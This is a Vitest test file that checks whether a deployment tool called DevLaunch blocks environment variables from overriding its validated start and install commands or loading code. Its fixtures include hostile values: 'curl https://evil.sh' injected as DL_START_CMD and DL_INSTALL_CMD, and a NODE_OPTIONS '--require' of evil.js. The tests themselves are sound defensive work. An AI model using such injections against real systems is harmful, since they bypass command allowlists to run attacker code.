import { describe, it, expect } from 'vitest';
import { RunPlanSchema, type RunPlan } from '@devlaunch/shared';
import { buildWrapperEnv } from '../services/docker/wrapper.js';

function plan(overrides: Partial<RunPlan> = {}): RunPlan {
  return RunPlanSchema.parse({
    runtime: { language: 'node', version: '20' },
    packageManager: 'npm',
    installCommand: 'npm install',
    buildCommand: null,
    startCommand: 'node server.js',
    workingDirectory: '.',
    expectedPort: 3000,
    planSource: 'rule-based',
    ...overrides,
  });
}

describe('environment variable injection', () => {
  it('a plan env var cannot override the validated start command', () => {
    // The allowlist validates startCommand, but the wrapper reads $DL_START_CMD. If a
    // plan-supplied variable can claim that name, validation is bypassed entirely.
    const env = buildWrapperEnv(
      plan({
        environmentVariables: [
          { key: 'DL_START_CMD', value: 'curl https://evil.sh', required: true },
        ],
      }),
      '/workspace',
    );
    expect(env).toContain('DL_START_CMD=node server.js');
    expect(env).not.toContain('DL_START_CMD=curl https://evil.sh');
  });

  it('a plan env var cannot override the install command or workdir', () => {
    const env = buildWrapperEnv(
      plan({
        environmentVariables: [
          { key: 'DL_INSTALL_CMD', value: 'curl https://evil.sh', required: true },
          { key: 'DL_WORKDIR', value: '/etc', required: true },
        ],
      }),
      '/workspace',
    );
    expect(env).toContain('DL_INSTALL_CMD=npm install');
    expect(env).toContain('DL_WORKDIR=/workspace');
  });

  it('still honours legitimate application variables', () => {
    const env = buildWrapperEnv(
      plan({ environmentVariables: [{ key: 'API_URL', value: 'https://x.test', required: true }] }),
      '/workspace',
    );
    expect(env).toContain('API_URL=https://x.test');
  });

  it('a legitimate PORT override still wins over the injected default', () => {
    const env = buildWrapperEnv(
      plan({ environmentVariables: [{ key: 'PORT', value: '9999', required: true }] }),
      '/workspace',
    );
    expect(env).toContain('PORT=9999');
  });
});

describe('ts-node variables that load code by name', () => {
  it('are refused from every plan, as NODE_OPTIONS is', async () => {
    const { validateEnvVarKey } = await import('../services/security/CommandValidator.js');
    expect(() => validateEnvVarKey('TS_NODE_COMPILER')).toThrow();
    expect(() => validateEnvVarKey('TS_NODE_TRANSPILER')).toThrow();
    // The repair's own switch loads nothing, and stays allowed.
    expect(validateEnvVarKey('TS_NODE_TRANSPILE_ONLY')).toBe('TS_NODE_TRANSPILE_ONLY');
  });
});

describe('OpenSSL\'s legacy algorithms for webpack 4', () => {
  // `necelentano/mern-ecommerce`'s client (react-scripts 4) stopped on
  // ERR_OSSL_EVP_UNSUPPORTED. The plan says yes or no; DevLaunch writes the one flag.
  it('becomes exactly --openssl-legacy-provider, beside a heap size when there is one', () => {
    expect(buildWrapperEnv(plan(), '/workspace', undefined, { legacyOpenssl: true })).toContain('NODE_OPTIONS=--openssl-legacy-provider');
    expect(buildWrapperEnv(plan(), '/workspace', undefined, { legacyOpenssl: true, nodeHeapMb: 3072 }))
      .toContain('NODE_OPTIONS=--max-old-space-size=3072 --openssl-legacy-provider');
    expect(buildWrapperEnv(plan(), '/workspace').some((e) => e.startsWith('NODE_OPTIONS='))).toBe(false);
  });

  it('cannot carry anything else in with it from a plan', () => {
    const env = buildWrapperEnv(
      plan({ environmentVariables: [{ key: 'NODE_OPTIONS', value: '--require=/workspace/evil.js', required: true }] }),
      '/workspace',
      undefined,
      { legacyOpenssl: true },
    );
    expect(env.filter((e) => e.startsWith('NODE_OPTIONS='))).toEqual(['NODE_OPTIONS=--openssl-legacy-provider']);
  });
});
